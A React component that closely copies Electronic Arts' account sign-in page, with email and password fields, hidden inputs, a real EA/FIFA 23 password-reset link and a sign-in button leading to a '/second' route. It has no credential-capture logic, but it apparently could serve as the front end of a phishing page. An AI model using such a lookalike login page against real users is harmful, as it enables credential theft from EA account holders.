import logo from "./logo.svg";
import "./App.css";
function App() {
  return (
    <div className="App">
      <div className="form-container">
        {/* <div
          className="otknotice-stripe otknotice-active"
          style="display: none;"
          id="junoBannerBox"
        >
          <div className="otknotice-stripe-message">
            <span className="otkicon">
              <svg
                height="24"
                viewBox="0 0 24 24"
                width="24"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g fill="none" fillRule="evenodd">
                  <path d="m0 0h24v24h-24z"></path>
                  <path
                    d="m12 1.5c5.7989899 0 10.5 4.70101013 10.5 10.5 0 5.7989899-4.7010101 10.5-10.5 10.5-5.79898987 0-10.5-4.7010101-10.5-10.5 0-5.79898987 4.70101013-10.5 10.5-10.5zm0 2c-4.69442037 0-8.5 3.80557963-8.5 8.5 0 4.6944204 3.80557963 8.5 8.5 8.5 4.6944204 0 8.5-3.8055796 8.5-8.5 0-4.69442037-3.8055796-8.5-8.5-8.5zm0 7.5c.5128358 0 .9355072.3860402.9932723.8833789l.0067277.1166211v4c0 .5522847-.4477153 1-1 1-.5128358 0-.9355072-.3860402-.9932723-.8833789l-.0067277-.1166211v-4c0-.5522847.4477153-1 1-1zm0-3.5c.5522847 0 1 .44771525 1 1s-.4477153 1-1 1-1-.44771525-1-1 .4477153-1 1-1z"
                    fill="#276afc"
                  ></path>
                </g>
              </svg>
            </span>
            <span className="otkc otkc-small">
              <strong> </strong>
            </span>
          </div>
        </div> */}

        <div id="logViews" className="views">
          <section id="loginBase">
            <img
              className="header"
              aria-hidden="true"
              src="./SIGN IN_files/EALogo-New.svg"
            />

            <div
              className="panel"
              id="login-with-OriginId-or-Email-panel"
              style={{display: "block"}}
            >
              <h1
                id="loginWithOriginIDTitle"
                className="otktitle otktitle-2"
                style={{display: "block"}}
              >
                Sign in to your EA Account
              </h1>

              <form id="login-form" method="post">
                <div className="otkform otkform-inputgroup input-margin-bottom-error-message">
                  <div className="otkform-group">
                    <label className="otklabel label-uppercase" htmlFor="email">
                      Email Address
                    </label>
                    <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message">
                      <input
                        type="text"
                        id="email"
                        name="email"
                        placeholder=""
                        autoCorrect="off"
                        autoCapitalize="off"
                        autoComplete="off"
                      />
                    </div>
                    <div
                      id="online-input-error-email"
                      className="otkform-group-help"
                    >
                      <p className="otkinput-errormsg otkc"></p>
                    </div>
                  </div>
                  <label className="otklabel label-uppercase" htmlFor="password">
                    Password
                  </label>
                  <div className="otkinput otkinput-grouped input-margin-bottom-error-message">
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Enter your password"
                      autoCorrect="off"
                      autoCapitalize="off"
                      autoComplete="off"
                    />
                    <i className="otkinput-capslock otkicon otkicon-capslock otkicon-capslock-position"></i>
                    {/* <button
                      role="button"
                      aria-label="Show password"
                      id="passwordShow"
                      className="otkbtn passwordShowBtn"
                    >
                      <span id="showIcon" className="quantum-input-icon eye-icon">
                        <svg
                          height="16"
                          viewBox="0 0 16 16"
                          width="16"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <g fill="none" fillRule="evenodd">
                            <path d="m0 0h16v16h-16z"></path>
                            <path
                              d="m8 3.66666667c3.2032732 0 6.6666667 2.54318984 6.6666667 4.33333333s-3.4633935 4.3333333-6.6666667 4.3333333c-3.20327316 0-6.66666667-2.54318981-6.66666667-4.3333333s3.46339351-4.33333333 6.66666667-4.33333333zm0 1.33333333c-1.38181706 0-2.74575629.50269607-3.87107038 1.3290207-.87134632.63983463-1.46226295 1.41228951-1.46226295 1.6709793s.59091663 1.03114467 1.46226295 1.6709793c1.12531409.8263246 2.48925332 1.3290207 3.87107038 1.3290207s2.7457563-.5026961 3.8710704-1.3290207c.8713463-.63983463 1.4622629-1.41228951 1.4622629-1.6709793s-.5909166-1.03114467-1.4622629-1.6709793c-1.1253141-.82632463-2.48925334-1.3290207-3.8710704-1.3290207zm0 1c1.1045695 0 2 .8954305 2 2s-.8954305 2-2 2-2-.8954305-2-2 .8954305-2 2-2zm0 1.33333333c-.36818983 0-.66666667.29847684-.66666667.66666667s.29847684.66666667.66666667.66666667.66666667-.29847684.66666667-.66666667-.29847684-.66666667-.66666667-.66666667z"
                              fill="#fff"
                            ></path>
                          </g>
                        </svg>
                      </span>
                      <span
                        id="hideIcon"
                        className="quantum-input-icon eye-icon hide-icon"
                      >
                        <svg
                          viewBox="0 0 24 24"
                          height="16"
                          width="16"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <g fillRule="evenodd" fill="none">
                            <path
                              d="M14.318 14.404a3 3 0 0 0-4.223-4.223l1.436 1.436a1 1 0 0 1 1.352 1.352l1.435 1.435zm-5.27-2.442a3 3 0 0 0 3.49 3.49l-3.49-3.49z"
                              fill="#fff"
                            ></path>
                            <path
                              d="M17.484 17.57c.546-.294 1.05-.617 1.506-.951.875-.643 1.597-1.348 2.11-2.02a5.54 5.54 0 0 0 .628-1.01c.15-.323.272-.7.272-1.089s-.122-.766-.272-1.088A5.54 5.54 0 0 0 21.1 10.4c-.514-.67-1.235-1.376-2.11-2.019C17.245 7.1 14.793 6 12 6c-1.824 0-3.503.47-4.934 1.152L8.585 8.67A9.309 9.309 0 0 1 12 8c2.27 0 4.318.9 5.807 1.994.742.545 1.321 1.12 1.704 1.621.192.251.323.468.403.64.071.153.083.231.086.244v.001c-.003.014-.015.092-.086.245a3.57 3.57 0 0 1-.403.64c-.383.5-.962 1.076-1.704 1.622a10.73 10.73 0 0 1-1.812 1.073l1.489 1.49zM6.718 9.632a9.89 9.89 0 0 0-.525.362c-.742.545-1.321 1.12-1.704 1.621a3.57 3.57 0 0 0-.403.64c-.071.153-.083.231-.086.244v.001c.003.014.015.092.086.245.08.172.21.389.403.64.383.5.962 1.076 1.704 1.622C7.683 16.1 9.73 17 12 17a8.92 8.92 0 0 0 1.882-.204l1.626 1.627c-1.08.357-2.26.577-3.508.577-2.792 0-5.245-1.1-6.99-2.381-.875-.643-1.597-1.348-2.11-2.02a5.544 5.544 0 0 1-.628-1.01c-.15-.323-.272-.7-.272-1.089s.122-.766.272-1.088A5.61 5.61 0 0 1 2.9 10.4c.513-.67 1.235-1.376 2.11-2.019.087-.064.176-.127.267-.19l1.44 1.441z"
                              fill="#fff"
                            ></path>
                            <path
                              d="M3.543 2.793a1 1 0 0 1 1.414 0l17 17a1 1 0 0 1-1.414 1.414l-17-17a1 1 0 0 1 0-1.414z"
                              fill="#fff"
                            ></path>
                          </g>
                        </svg>
                      </span>
                    </button> */}
                  </div>
                </div>

                <div id="online-general-error" className="otkform-group-help">
                  <p className="otkinput-errormsg otkc"></p>
                </div>
                <div id="offline-general-error" className="otkform-group-help">
                  <p className="otkinput-errormsg otkc">
                    You must be online when logging in for the first time.
                  </p>
                </div>
                <div id="offline-auth-error" className="otkform-group-help">
                  <p className="otkinput-errormsg otkc">
                    Your credentials are incorrect or have expired. Please try
                    again or reset your password.
                  </p>
                </div>

                <div id="captcha-container"></div>

                <div className="panel-action-area">
                  <input
                    type="hidden"
                    name="_eventId"
                    value="submit"
                    id="_eventId"
                  />
                  <input type="hidden" id="cid" name="cid" value="" />

                  <input
                    type="hidden"
                    id="showAgeUp"
                    name="showAgeUp"
                    value="true"
                  />

                  <input
                    type="hidden"
                    id="thirdPartyCaptchaResponse"
                    name="thirdPartyCaptchaResponse"
                    value=""
                  />

                  <input
                    type="hidden"
                    id="loginMethod"
                    name="loginMethod"
                    value=""
                  />

                  <span className="otkcheckbox checkbox-login-first">
                    <input type="hidden" name="_rememberMe" value="on" />
                    <input
                      type="checkbox"
                      id="rememberMe"
                      name="rememberMe"
                    />
                    <label htmlFor="rememberMe">
                      <span id="content" className="link-in-message">
                        Remember me
                      </span>
                    </label>
                  </span>
                  <div className="button-top-separator"></div>
                  <a
                    role="button"
                    className="otkbtn otkbtn-primary"
                    href="/second"
                    id="logInBtn"
                  >
                    Sign in
                  </a>
                  <input type="hidden" id="errorCode" value="" />
                  <input type="hidden" id="errorCodeWithDescription" value="" />
                  <input type="hidden" id="storeKey" value="" />
                  <input type="hidden" id="bannerType" value="" />
                  <input type="hidden" id="bannerText" value="" />
                </div>
              </form>
              <div className="separator-32"></div>
              <div id="forgot-password-section">
                <a
                  id="forget-password"
                  href="https://signin.ea.com/p/juno/resetPassword?fid=RlMxOjMuMDoyLjA6em9iMWtPVUxmcXhwdXpsZW9mVGM4MnU1OnFmcWJo&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fhide_create%3Dtrue%26display%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26release_type%3Dprod%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Ffifa%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3D%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFIFA23_JS_WEB_APP"
                  className="otka otkc"
                >
                  Forgot your password?
                </a>
              </div>
            </div>
          </section>
        </div>
      </div>
      <div>
        <p id="form-password-show-text" className="otkc otkform-group-help">
          SHOW
        </p>
        <p id="form-password-hide-text" className="otkc otkform-group-help">
          HIDE
        </p>
        <p id="email-invalid-text" className="otkc otkform-group-help">
          Email address is invalid
        </p>
        <p id="ea-id-invalid-text" className="otkc otkform-group-help">
          EA ID is invalid
        </p>
        <p id="email-password-empty-text" className="otkc otkform-group-help">
          Your credentials are incorrect or have expired. Please try again or
          reset your password.
        </p>
      </div>

      <link
        rel="stylesheet"
        type="text/css"
        href="chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/css/blur.css"
        className="loom-blur-styles"
      />
    </div>
  );
}
export default App;
